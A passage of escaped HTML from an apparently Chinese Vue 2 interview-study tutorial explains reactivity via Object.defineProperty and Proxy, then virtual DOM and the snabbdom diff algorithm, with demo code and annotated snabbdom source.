把变化落实到真实 <code>DOM</code>。</strong> <code>Vue 2</code> 用 <code>Object.defineProperty</code> 劫持已有属性，深层对象需要递归处理，数组则通过重写变异方法触发更新。虚拟 <code>DOM</code> 用 <code>vnode</code> 描述页面，同层比较新旧节点，并依靠 <code>tag</code> 和 <code>key</code> 判断复用或重建。它减少了不必要的真实 <code>DOM</code> 操作，但新增、删除属性仍需 <code>Vue.set</code>、<code>Vue.delete</code> 处理。</p>\\n</section>\\n<h3 id=\\"响应式原理\\"><a class=\\"header-anchor\\" href=\\"#响应式原理\\">#</a> 响应式原理</h3>\\n<p><strong>响应式</strong></p>\\n<ul>\\n<li>组件<code>data</code>数据一旦变化，立刻触发视图的更新</li>\\n<li>实现数据驱动视图的第一步</li>\\n<li>核心API：<code>Object.defineProperty</code>\\n<ul>\\n<li><strong>缺点</strong>\\n<ul>\\n<li>深度监听，需要递归到底，一次计算量大</li>\\n<li>无法监听新增属性、删除属性（使用<code>Vue.set</code>、<code>Vue.delete</code>可以）</li>\\n<li>无法监听原生数组，需要重写数组原型</li>\\n</ul>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// 触发更新视图\\nfunction updateView() {\\n    console.log(&#39;视图更新&#39;)\\n}\\n\\n// 重新定义数组原型\\nconst oldArrayProperty = Array.prototype\\n// 创建新对象，原型指向 oldArrayProperty ，再扩展新的方法不会影响原型\\nconst arrProto = Object.create(oldArrayProperty);\\n[&#39;push&#39;, &#39;pop&#39;, &#39;shift&#39;, &#39;unshift&#39;, &#39;splice&#39;].forEach(methodName =&gt; {\\n    arrProto[methodName] = function () {\\n        updateView() // 触发视图更新\\n        oldArrayProperty[methodName].call(this, ...arguments)\\n        // Array.prototype.push.call(this, ...arguments)\\n    }\\n})\\n\\n// 重新定义属性，监听起来\\nfunction defineReactive(target, key, value) {\\n    // 深度监听\\n    observer(value)\\n\\n    // 核心 API\\n    Object.defineProperty(target, key, {\\n        get() {\\n            return value\\n        },\\n        set(newValue) {\\n            if (newValue !== value) {\\n                // 深度监听\\n                observer(newValue)\\n\\n                // 设置新值\\n                // 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值\\n                value = newValue\\n\\n                // 触发更新视图\\n                updateView()\\n            }\\n        }\\n    })\\n}\\n\\n// 监听对象属性\\nfunction observer(target) {\\n    if (typeof target !== &#39;object&#39; || target === null) {\\n        // 不是对象或数组\\n        return target\\n    }\\n\\n    // 污染全局的 Array 原型\\n    // Array.prototype.push = function () {\\n    //     updateView()\\n    //     ...\\n    // }\\n\\n    if (Array.isArray(target)) {\\n        target.__proto__ = arrProto\\n    }\\n\\n    // 重新定义各个属性（for in 也可以遍历数组）\\n    for (let key in target) {\\n        defineReactive(target, key, target[key])\\n    }\\n}\\n\\n// 准备数据\\nconst data = {\\n    name: &#39;zhangsan&#39;,\\n    age: 20,\\n    info: {\\n        address: &#39;shenzhen&#39; // 需要深度监听\\n    },\\n    nums: [10, 20, 30]\\n}\\n\\n// 监听数据\\nobserver(data)\\n\\n// 测试\\n// data.name = &#39;lisi&#39;\\n// data.age = 21\\n// // console.log(&#39;age&#39;, data.age)\\n// data.x = &#39;100&#39; // 新增属性，监听不到 —— 所以有 Vue.set\\n// delete data.name // 删除属性，监听不到 —— 所有已 Vue.delete\\n// data.info.address = &#39;上海&#39; // 深度监听\\ndata.nums.push(4) // 监听数组\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// proxy-demo\\n\\n// const data = {\\n//     name: &#39;zhangsan&#39;,\\n//     age: 20,\\n// }\\nconst data = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]\\n\\nconst proxyData = new Proxy(data, {\\n    get(target, key, receiver) {\\n        // 只处理本身（非原型的）属性\\n        const ownKeys = Reflect.ownKeys(target)\\n        if (ownKeys.includes(key)) {\\n            console.log(&#39;get&#39;, key) // 监听\\n        }\\n\\n        const result = Reflect.get(target, key, receiver)\\n        return result // 返回结果\\n    },\\n    set(target, key, val, receiver) {\\n        // 重复的数据，不处理\\n        if (val === target[key]) {\\n            return true\\n        }\\n\\n        const result = Reflect.set(target, key, val, receiver)\\n        console.log(&#39;set&#39;, key, val)\\n        // console.log(&#39;result&#39;, result) // true\\n        return result // 是否设置成功\\n    },\\n    deleteProperty(target, key) {\\n        const result = Reflect.deleteProperty(target, key)\\n        console.log(&#39;delete property&#39;, key)\\n        // console.log(&#39;result&#39;, result) // true\\n        return result // 是否删除成功\\n    }\\n})\\n</code></pre>\\n<h3 id=\\"vdom和diff算法\\"><a class=\\"header-anchor\\" href=\\"#vdom和diff算法\\">#</a> vdom和diff算法</h3>\\n<p><strong>1. vdom</strong></p>\\n<ul>\\n<li><strong>背景</strong>\\n<ul>\\n<li><code>DOM</code>操作非常耗时</li>\\n<li>以前用<code>jQuery</code>，可以自行控制<code>DOM</code>操作时机，手动调整</li>\\n<li><code>Vue</code>和<code>React</code>是数据驱动视图，如何有效控制<code>DOM</code>操作</li>\\n</ul>\\n</li>\\n<li><strong>解决方案VDOM</strong>\\n<ul>\\n<li>有了一定的复杂度，想减少计算次数比较难</li>\\n<li>能不能把计算，更多的转移为JS计算？因为<code>JS</code>执行速度很快</li>\\n<li><code>vdom</code> 用<code>JS</code>模拟<code>DOM</code>结构，计算出最小的变更，操作<code>DOM</code></li>\\n</ul>\\n</li>\\n<li><strong>用JS模拟DOM结构</strong><br>\\n<img src=\\"https://s.poetries.top/uploads/2023/02/34c8532904ffd12f.png\\" alt=\\"\\"></li>\\n<li><strong>通过snabbdom学习vdom</strong>\\n<ul>\\n<li>简洁强大的<code>vdom</code>库</li>\\n<li><code>vue2</code>参考它实现的<code>vdom</code>和<code>diff</code></li>\\n<li><strong>snabbdom</strong>\\n<ul>\\n<li><code>h</code>函数</li>\\n<li><code>vnode</code>数据结构</li>\\n<li><code>patch</code>函数</li>\\n</ul>\\n</li>\\n</ul>\\n</li>\\n<li><strong>vdom总结</strong>\\n<ul>\\n<li>用<code>JS</code>模拟<code>DOM</code>结构（<code>vnode</code>）</li>\\n<li>新旧<code>vnode</code>对比，得出最小的更新范围，有效控制<code>DOM</code>操作</li>\\n<li>数据驱动视图模式下，有效控制<code>DOM</code>操作</li>\\n</ul>\\n</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;!-- snabbdom-demo --&gt;\\n\\n&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;\\n&lt;button id=&quot;btn-change&quot;&gt;change&lt;/button&gt;\\n\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-class.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-props.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-style.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-eventlisteners.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/h.js&quot;&gt;&lt;/script&gt;\\n&lt;script&gt;\\n    const snabbdom = window.snabbdom\\n\\n    // 定义 patch\\n    const patch = snabbdom.init([\\n        snabbdom_class,\\n        snabbdom_props,\\n        snabbdom_style,\\n        snabbdom_eventlisteners\\n    ])\\n\\n    // 定义 h\\n    const h = snabbdom.h\\n\\n    const container = document.getElementById(&#39;container&#39;)\\n\\n    // 生成 vnode\\n    const vnode = h(&#39;ul#list&#39;, {}, [\\n        h(&#39;li.item&#39;, {}, &#39;Item 1&#39;),\\n        h(&#39;li.item&#39;, {}, &#39;Item 2&#39;)\\n    ])\\n    patch(container, vnode)\\n\\n    document.getElementById(&#39;btn-change&#39;).addEventListener(&#39;click&#39;, () =&gt; {\\n        // 生成 newVnode\\n        const newVnode = h(&#39;ul#list&#39;, {}, [\\n            h(&#39;li.item&#39;, {}, &#39;Item 1&#39;),\\n            h(&#39;li.item&#39;, {}, &#39;Item B&#39;),\\n            h(&#39;li.item&#39;, {}, &#39;Item 3&#39;)\\n        ])\\n        patch(vnode, newVnode)\\n\\n        // vnode = newVnode // patch 之后，应该用新的覆盖现有的 vnode ，否则每次 change 都是新旧对比\\n    })\\n\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- table-without-vdom.html --&gt;\\n&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;\\n&lt;button id=&quot;btn-change&quot;&gt;change&lt;/button&gt;\\n\\n&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdn.bootcss.com/jquery/3.2.0/jquery.js&quot;&gt;&lt;/script&gt;\\n&lt;script type=&quot;text/javascript&quot;&gt;\\n    const data = [\\n        {\\n            name: &#39;张三&#39;,\\n            age: &#39;20&#39;,\\n            address: &#39;北京&#39;\\n        },\\n        {\\n            name: &#39;李四&#39;,\\n            age: &#39;21&#39;,\\n            address: &#39;上海&#39;\\n        },\\n        {\\n            name: &#39;王五&#39;,\\n            age: &#39;22&#39;,\\n            address: &#39;广州&#39;\\n        }\\n    ]\\n\\n    // 渲染函数\\n    function render(data) {\\n        const $container = $(&#39;#container&#39;)\\n\\n        // 清空容器，重要！！！\\n        $container.html(&#39;&#39;)\\n\\n        // 拼接 table\\n        const $table = $(&#39;&lt;table&gt;&#39;)\\n\\n        $table.append($(&#39;&lt;tr&gt;&lt;td&gt;name&lt;/td&gt;&lt;td&gt;age&lt;/td&gt;&lt;td&gt;address&lt;/td&gt;/tr&gt;&#39;))\\n        data.forEach(item =&gt; {\\n            $table.append($(&#39;&lt;tr&gt;&lt;td&gt;&#39; + item.name + &#39;&lt;/td&gt;&lt;td&gt;&#39; + item.age + &#39;&lt;/td&gt;&lt;td&gt;&#39; + item.address + &#39;&lt;/td&gt;/tr&gt;&#39;))\\n        })\\n\\n        // 渲染到页面\\n        $container.append($table)\\n    }\\n\\n    $(&#39;#btn-change&#39;).click(() =&gt; {\\n        data[1].age = 30\\n        data[2].address = &#39;深圳&#39;\\n        // re-render  再次渲染\\n        render(data)\\n    })\\n\\n    // 页面加载完立刻执行（初次渲染）\\n    render(data)\\n\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- table-with-vdom --&gt;\\n\\n&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;\\n&lt;button id=&quot;btn-change&quot;&gt;change&lt;/button&gt;\\n\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-class.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-props.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-style.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-eventlisteners.js&quot;&gt;&lt;/script&gt;\\n&lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/h.js&quot;&gt;&lt;/script&gt;\\n&lt;script type=&quot;text/javascript&quot;&gt;\\n    const snabbdom = window.snabbdom\\n    // 定义关键函数 patch\\n    const patch = snabbdom.init([\\n        snabbdom_class,\\n        snabbdom_props,\\n        snabbdom_style,\\n        snabbdom_eventlisteners\\n    ])\\n\\n    // 定义关键函数 h\\n    const h = snabbdom.h\\n\\n    // 原始数据\\n    const data = [\\n        {\\n            name: &#39;张三&#39;,\\n            age: &#39;20&#39;,\\n            address: &#39;北京&#39;\\n        },\\n        {\\n            name: &#39;李四&#39;,\\n            age: &#39;21&#39;,\\n            address: &#39;上海&#39;\\n        },\\n        {\\n            name: &#39;王五&#39;,\\n            age: &#39;22&#39;,\\n            address: &#39;广州&#39;\\n        }\\n    ]\\n    // 把表头也放在 data 中\\n    data.unshift({\\n        name: &#39;姓名&#39;,\\n        age: &#39;年龄&#39;,\\n        address: &#39;地址&#39;\\n    })\\n\\n    const container = document.getElementById(&#39;container&#39;)\\n\\n    // 渲染函数\\n    let vnode\\n    function render(data) {\\n        const newVnode = h(&#39;table&#39;, {}, data.map(item =&gt; {\\n            const tds = []\\n            for (let i in item) {\\n                if (item.hasOwnProperty(i)) {\\n                    tds.push(h(&#39;td&#39;, {}, item[i] + &#39;&#39;))\\n                }\\n            }\\n            return h(&#39;tr&#39;, {}, tds)\\n        }))\\n\\n        if (vnode) {\\n            // re-render\\n            patch(vnode, newVnode)\\n        } else {\\n            // 初次渲染\\n            patch(container, newVnode)\\n        }\\n\\n        // 存储当前的 vnode 结果\\n        vnode = newVnode\\n    }\\n\\n    // 初次渲染\\n    render(data)\\n\\n\\n    const btnChange = document.getElementById(&#39;btn-change&#39;)\\n    btnChange.addEventListener(&#39;click&#39;, () =&gt; {\\n        data[1].age = 30\\n        data[2].address = &#39;深圳&#39;\\n        // re-render\\n        render(data)\\n    })\\n\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>2. diff算法</strong></p>\\n<ul>\\n<li><code>diff</code>算法是<code>vdom</code>中最核心、最关键的部分</li>\\n<li><code>diff</code>算法能在日常使用<code>vue</code> <code>react</code>中提现出来（如<code>key</code>）</li>\\n</ul>\\n<p><strong>树的diff的时间复杂度O(n^3)</strong></p>\\n<ul>\\n<li>第一，遍历<code>tree1</code></li>\\n<li>第二，遍历<code>tree2</code></li>\\n<li>第三，排序</li>\\n<li><code>1000</code>个节点，要计算<code>10</code>亿次，算法不可用</li>\\n</ul>\\n<p><strong>优化时间复杂度到O(n)</strong></p>\\n<ul>\\n<li>只比较同一层级，不跨级比较</li>\\n<li><code>tag</code>不想同，则直接删掉重建，不再深度比较</li>\\n<li><code>tag</code>和<code>key</code>相同，则认为是相同节点，不再深度比较</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/9e81506ea3345aea.png\\" alt=\\"\\">\\n<img src=\\"https://s.poetries.top/uploads/2023/02/f304938694b28862.png\\" alt=\\"\\"></p>\\n<p><strong>diff过程细节</strong></p>\\n<ul>\\n<li>新旧节点都有<code>children</code>，执行<code>updateChildren</code> <code>diff</code>对比\\n<img src=\\"https://s.poetries.top/uploads/2023/02/2a4ac0a956e99b22.png\\" alt=\\"\\">\\n<ul>\\n<li>开始和开始对比--头头</li>\\n<li>结束和结束对比--尾尾</li>\\n<li>开始和结束对比--头尾</li>\\n<li>结束和开始对比--尾头</li>\\n<li>以上四个都未命中：拿新节点 <code>key</code> ，能否对应上 <code>oldCh</code> 中的某个节点的 <code>key</code></li>\\n</ul>\\n</li>\\n<li>新<code>children</code>有，旧<code>children</code>无：清空旧<code>text</code>节点，新增新<code>children</code>节点</li>\\n<li>旧<code>children</code>有，新<code>children</code>无：移除旧<code>children</code></li>\\n<li>否则旧<code>text</code>有，设置<code>text</code>为空</li>\\n</ul>\\n<p><strong>vdom和diff算法总结</strong></p>\\n<ul>\\n<li>细节不重要，<code>updateChildren</code>的过程也不重要，不要深究</li>\\n<li><code>vdom</code>的核心概念很重要：<code>h</code>、<code>vnode</code>、<code>patch</code>、<code>diff</code>、<code>key</code></li>\\n<li><code>vdom</code>存在的价值更重要，数据驱动视图，控制<code>dom</code>操作</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// snabbdom源码位于 src/snabbdom.ts\\n/* global module, document, Node */\\nimport { Module } from &#39;./modules/module&#39;;\\nimport vnode, { VNode } from &#39;./vnode&#39;;\\nimport * as is from &#39;./is&#39;;\\nimport htmlDomApi, { DOMAPI } from &#39;./htmldomapi&#39;;\\n\\ntype NonUndefined&lt;T&gt; = T extends undefined ? never : T;\\n\\nfunction isUndef (s: any): boolean { return s === undefined; }\\nfunction isDef&lt;A&gt; (s: A): s is NonUndefined&lt;A&gt; { return s !== undefined; }\\n\\ntype VNodeQueue = VNode[];\\n\\nconst emptyNode = vnode(&#39;&#39;, {}, [], undefined, undefined);\\n\\nfunction sameVnode (vnode1: VNode, vnode2: VNode): boolean {\\n  // key 和 sel 都相等\\n  // undefined === undefined // true\\n  return vnode1.key === vnode2.key &amp;&amp; vnode1.sel === vnode2.sel;\\n}\\n\\nfunction isVnode (vnode: any): vnode is VNode {\\n  return vnode.sel !== undefined;\\n}\\n\\ntype KeyToIndexMap = {[key: string]: number};\\n\\ntype ArraysOf&lt;T&gt; = {\\n  [K in keyof T]: Array&lt;T[K]&gt;;\\n}\\n\\ntype ModuleHooks = ArraysOf&lt;Module&gt;;\\n\\nfunction createKeyToOldIdx (children: VNode[], beginIdx: number, endIdx: number): KeyToIndexMap {\\n  const map: KeyToIndexMap = {};\\n  for (let i = beginIdx; i &lt;= endIdx; ++i) {\\n    const key = children[i]?.key;\\n    if (key !== undefined) {\\n      map[key] = i;\\n    }\\n  }\\n  return map;\\n}\\n\\nconst hooks: Array&lt;keyof Module&gt; = [&#39;create&#39;, &#39;update&#39;, &#39;remove&#39;, &#39;destroy&#39;, &#39;pre&#39;, &#39;post&#39;];\\n\\nexport { h } from &#39;./h&#39;;\\nexport { thunk } from &#39;./thunk&#39;;\\n\\nexport function init (modules: Array&lt;Partial&lt;Module&gt;&gt;, domApi?: DOMAPI) {\\n  let i: number, j: number, cbs = ({} as ModuleHooks);\\n\\n  const api: DOMAPI = domApi !== undefined ? domApi : htmlDomApi;\\n\\n  for (i = 0; i &lt; hooks.length; ++i) {\\n    cbs[hooks[i]] = [];\\n    for (j = 0; j &lt; modules.length; ++j) {\\n      const hook = modules[j][hooks[i]];\\n      if (hook !== undefined) {\\n        (cbs[hooks[i]] as any[]).push(hook);\\n      }\\n    }\\n  }\\n\\n  function emptyNodeAt (elm: Element) {\\n    const id = elm.id ? &#39;#&#39; + elm.id : &#39;&#39;;\\n    const c = elm.className ? &#39;.&#39; + elm.className.split(&#39; &#39;).join(&#39;.&#39;) : &#39;&#39;;\\n    return vnode(api.tagName(elm).toLowerCase() + id + c, {}, [], undefined, elm);\\n  }\\n\\n  function createRmCb (childElm: Node, listeners: number) {\\n    return function rmCb () {\\n      if (--listeners === 0) {\\n        const parent = api.parentNode(childElm);\\n        api.removeChild(parent, childElm);\\n      }\\n    };\\n  }\\n\\n  function createElm (vnode: VNode, insertedVnodeQueue: VNodeQueue): Node {\\n    let i: any, data = vnode.data;\\n    if (data !== undefined) {\\n      const init = data.hook?.init;\\n      if (isDef(init)) {\\n        init(vnode);\\n        data = vnode.data;\\n      }\\n    }\\n    let children = vnode.children, sel = vnode.sel;\\n    if (sel === &#39;!&#39;) {\\n      if (isUndef(vnode.text)) {\\n        vnode.text = &#39;&#39;;\\n      }\\n      vnode.elm = api.createComment(vnode.text!);\\n    } else if (sel !== undefined) {\\n      // Parse selector\\n      const hashIdx = sel.indexOf(&#39;#&#39;);\\n      const dotIdx = sel.indexOf(&#39;.&#39;, hashIdx);\\n      const hash = hashIdx &gt; 0 ? hashIdx : sel.length;\\n      const dot = dotIdx &gt; 0 ? dotIdx : sel.length;\\n      const tag = hashIdx !== -1 || dotIdx !== -1 ? sel.slice(0, Math.min(hash, dot)) : sel;\\n      const elm = vnode.elm = isDef(data) &amp;&amp; isDef(i = data.ns)\\n        ? api.createElementNS(i, tag)\\n        : api.createElement(tag);\\n      if (hash &lt; dot) elm.setAttribute(&#39;id&#39;, sel.slice(hash + 1, dot));\\n      if (dotIdx &gt; 0) elm.setAttribute(&#39;class&#39;, sel.slice(dot + 1).replace(/\\\\./g, &#39; &#39;));\\n      for (i = 0; i &lt; cbs.create.length; ++i) cbs.create[i](emptyNode, vnode);\\n      if (is.array(children)) {\\n        for (i = 0; i &lt; children.length; ++i) {\\n          const ch = children[i];\\n          if (ch != null) {\\n            api.appendChild(elm, createElm(ch as VNode, insertedVnodeQueue));\\n          }\\n        }\\n      } else if (is.primitive(vnode.text)) {\\n        api.appendChild(elm, api.createTextNode(vnode.text));\\n      }\\n      const hook = vnode.data!.hook;\\n      if (isDef(hook)) {\\n        hook.create?.(emptyNode, vnode);\\n        if (hook.insert) {\\n          insertedVnodeQueue.push(vnode);\\n        }\\n      }\\n    } else {\\n      vnode.elm = api.createTextNode(vnode.text!);\\n    }\\n    return vnode.elm;\\n  }\\n\\n  function addVnodes (\\n    parentElm: Node,\\n    before: Node | null,\\n    vnodes: VNode[],\\n    startIdx: number,\\n    endIdx: number,\\n    insertedVnodeQueue: VNodeQueue\\n  ) {\\n    for (; startIdx &lt;= endIdx; ++startIdx) {\\n      const ch = vnodes[startIdx];\\n      if (ch != null) {\\n        api.insertBefore(parentElm, createElm(ch, insertedVnodeQueue), before);\\n      }\\n    }\\n  }\\n\\n  function invokeDestroyHook (vnode: VNode) {\\n    const data = vnode.data;\\n    if (data !== undefined) {\\n      data?.hook?.destroy?.(vnode);\\n      for (let i = 0; i &lt; cbs.destroy.length; ++i) cbs.destroy[i](vnode);\\n      if (vnode.children !== undefined) {\\n        for (let j = 0; j &lt; vnode.children.length; ++j) {\\n          const child = vnode.children[j];\\n          if (child != null &amp;&amp; typeof child !== &quot;string&quot;) {\\n            invokeDestroyHook(child);\\n          }\\n        }\\n      }\\n    }\\n  }\\n\\n  function removeVnodes (parentElm: Node,\\n    vnodes: VNode[],\\n    startIdx: number,\\n    endIdx: number): void {\\n    for (; startIdx &lt;= endIdx; ++startIdx) {\\n      let listeners: number, rm: () =&gt; void, ch = vnodes[startIdx];\\n      if (ch != null) {\\n        if (isDef(ch.sel)) {\\n          invokeDestroyHook(ch); // hook 操作\\n\\n          // 移除 DOM 元素\\n          listeners = cbs.remove.length + 1;\\n          rm = createRmCb(ch.elm!, listeners);\\n          for (let i = 0; i &lt; cbs.remove.length; ++i) cbs.remove[i](ch, rm);\\n          const removeHook = ch?.data?.hook?.remove;\\n          if (isDef(removeHook)) {\\n            removeHook(ch, rm);\\n          } else {\\n            rm();\\n          }\\n        } else { // Text node\\n          api.removeChild(parentElm, ch.elm!);\\n        }\\n      }\\n    }\\n  }\\n\\n  // diff算法核心\\n  function updateChildren (parentElm: Node,\\n    oldCh: VNode[],\\n    newCh: VNode[],\\n    insertedVnodeQueue: VNodeQueue) {\\n    let oldStartIdx = 0, newStartIdx = 0;\\n    let oldEndIdx = oldCh.length - 1;\\n    let oldStartVnode = oldCh[0];\\n    let oldEndVnode = oldCh[oldEndIdx];\\n    let newEndIdx = newCh.length - 1;\\n    let newStartVnode = newCh[0];\\n    let newEndVnode = newCh[newEndIdx];\\n    let oldKeyToIdx: KeyToIndexMap | undefined;\\n    let idxInOld: number;\\n    let elmToMove: VNode;\\n    let before: any;\\n\\n    while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) {\\n      if (oldStartVnode == null) {\\n        oldStartVnode = oldCh[++oldStartIdx]; // Vnode might have been moved left\\n      } else if (oldEndVnode == null) {\\n        oldEndVnode = oldCh[--oldEndIdx];\\n      } else if (newStartVnode == null) {\\n        newStartVnode = newCh[++newStartIdx];\\n      } else if (newEndVnode == null) {\\n        newEndVnode = newCh[--newEndIdx];\\n\\n      // 开始和开始对比--头头\\n      } else if (sameVnode(oldStartVnode, newStartVnode)) {\\n        patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue);\\n        oldStartVnode = oldCh[++oldStartIdx];\\n        newStartVnode = newCh[++newStartIdx];\\n      \\n      // 结束和结束对比--尾尾\\n      } else if (sameVnode(oldEndVnode, newEndVnode)) {\\n        patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue);\\n        oldEndVnode = oldCh[--oldEndIdx];\\n        newEndVnode = newCh[--newEndIdx];\\n\\n      // 开始和结束对比--头尾\\n      } else if (sameVnode(oldStartVnode, newEndVnode)) { // Vnode moved right\\n        patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue);\\n        api.insertBefore(parentElm, oldStartVnode.elm!, api.nextSibling(oldEndVnode.elm!));\\n        oldStartVnode = oldCh[++oldStartIdx];\\n        newEndVnode = newCh[--newEndIdx];\\n\\n      // 结束和开始对比--尾头\\n      } else if (sameVnode(oldEndVnode, newStartVnode)) { // Vnode moved left\\n        patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue);\\n        api.insertBefore(parentElm, oldEndVnode.elm!, oldStartVnode.elm!);\\n        oldEndVnode = oldCh[--oldEndIdx];\\n        newStartVnode = newCh[++newStartIdx];\\n\\n      // 以上四个都未命中\\n      } else {\\n        if (oldKeyToIdx === undefined) {\\n          oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx);\\n        }\\n        // 拿新节点 key ，能否对应上 oldCh 中的某个节点的 key\\n        idxInOld = oldKeyToIdx[newStartVnode.key as string];\\n  \\n        // 没对应上\\n        if (isUndef(idxInOld)) { // New element\\n          api.insertBefore(parentElm, createElm(newStartVnode, insertedVnodeQueue), oldStartVnode.elm!);\\n          newStartVnode = newCh[++newStartIdx];\\n        \\n        // 对应上了\\n        } else {\\n          // 对应上 key 的节点\\n          elmToMove = oldCh[idxInOld];\\n\\n          // sel 是否相等（sameVnode 的条件）\\n          if (elmToMove.sel !== newStartVnode.sel) {\\n            // New element\\n            api.insertBefore(parentElm, createElm(newStartVnode, insertedVnodeQueue), oldStartVnode.elm!);\\n          \\n          // sel 相等，key 相等\\n          } else {\\n            patchVnode(elmToMove, newStartVnode, insertedVnodeQueue);\\n            oldCh[idxInOld] = undefined as any;\\n            api.insertBefore(parentElm, elmToMove.elm!, oldStartVnode.elm!);\\n          }\\n          newStartVnode = newCh[++newStartIdx];\\n        }\\n      }\\n    }\\n    if (oldStartIdx &lt;= oldEndIdx || newStartIdx &lt;= newEndIdx) {\\n      if (oldStartIdx &gt; oldEndIdx) {\\n        before = newCh[newEndIdx + 1] == null ? null : newCh[newEndIdx + 1].elm;\\n        addVnodes(parentElm, before, newCh, newStartIdx, newEndIdx, insertedVnodeQueue);\\n      } else {\\n        removeVnodes(parentElm, oldCh, oldStartIdx, oldEndIdx);\\n      }\\n    }\\n  }\\n\\n  function patchVnode (oldVnode: VNode, vnode: VNode, insertedVnodeQueue: VNodeQueue) {\\n    // 执行 prepatch hook\\n    const hook = vnode.data?.hook;\\n    hook?.prepatch?.(oldVnode, vnode);\\n\\n    // 设置 vnode.elem\\n    const elm = vnode.elm = oldVnode.elm!;\\n  \\n    // 旧 children\\n    let oldCh = oldVnode.children as VNode[];\\n    // 新 children\\n    let ch = vnode.children as VNode[];\\n\\n    if (oldVnode === vnode) return;\\n  \\n    // hook 相关\\n    if (vnode.data !== undefined) {\\n      for (let i = 0; i &lt; cbs.update.length; ++i) cbs.update[i](oldVnode, vnode);\\n      vnode.data.hook?.update?.(oldVnode, vnode);\\n    }\\n\\n    // vnode.text === undefined （vnode.children 一般有值）\\n    if (isUndef(vnode.text)) {\\n      // 新旧都有 children\\n      if (isDef(oldCh) &amp;&amp; isDef(ch)) {\\n        if (oldCh !== ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue);\\n      // 新 children 有，旧 children 无 （旧 text 有）\\n      } else if (isDef(ch)) {\\n        // 清空 text\\n        if (isDef(oldVnode.text)) api.setTextContent(elm, &#39;&#39;);\\n        // 添加 children\\n        addVnodes(elm, null, ch, 0, ch.length - 1, insertedVnodeQueue);\\n      // 旧 child 有，新 child 无\\n      } else if (isDef(oldCh)) {\\n        // 移除 children\\n        removeVnodes(elm, oldCh, 0, oldCh.length - 1);\\n      // 旧 text 有\\n      } else if (isDef(oldVnode.text)) {\\n        api.setTextContent(elm, &#39;&#39;);\\n      }\\n\\n    // else : vnode.text !== undefined （vnode.children 无值）\\n    } else if (oldVnode.text !== vnode.text) {\\n      // 移除旧 children\\n      if (isDef(oldCh)) {\\n        removeVnodes(elm, oldCh, 0, oldCh.length - 1);\\n      }\\n      // 设置新 text\\n      api.setTextContent(elm, vnode.text!);\\n    }\\n    hook?.postpatch?.(oldVnode, vnode);\\n  }\\n\\n  return function patch (oldVnode: VNode | Element, vnode: VNode): VNode {\\n    let i: number, elm: Node, parent: Node;\\n    const insertedVnodeQueue: VNodeQueue = [];\\n    // 执行 pre hook\\n    for (i = 0; i &lt; cbs.pre.length; ++i) cbs.pre[i]();\\n\\n    // 第一个参数不是 vnode\\n    if (!isVnode(oldVnode)) {\\n      // 创建一个空的 vnode ，关联到这个 DOM 元素\\n      oldVnode = emptyNodeAt(oldVnode);\\n    }\\n\\n    // 相同的 vnode（key 和 sel 都相等）\\n    if (sameVnode(oldVnode, vnode)) {\\n      // vnode 对比\\n      patchVnode(oldVnode, vnode, insertedVnodeQueue);\\n    \\n    // 不同的 vnode ，直接删掉重建\\n    } else {\\n      elm = oldVnode.elm!;\\n      parent = api.parentNode(elm);\\n\\n      // 重建\\n      createElm(vnode, insertedVnodeQueue);\\n\\n      if (parent !== null) {\\n        api.insertBefore(parent, vnode.elm!, api.nextSibling(elm));\\n        removeVnodes(parent, [oldVnode], 0, 0);\\n      }\\n    }\\n\\n    for (i = 0; i &lt; insertedVnodeQueue.length; ++i) {\\n      insertedVnodeQueue[i].data!.hook!.insert!(insertedVnodeQueue[i]);\\n    }\\n    for (i = 0; i &lt; cbs.post.length; ++i) cbs.post[i]();\\n    return vnode;\\n  };\\n}\\n</code></pre>\\n<h3 id=\\"模板编译\\"><a class=\\"header-anchor\\" href=\\"#模板编译\\">#</a> 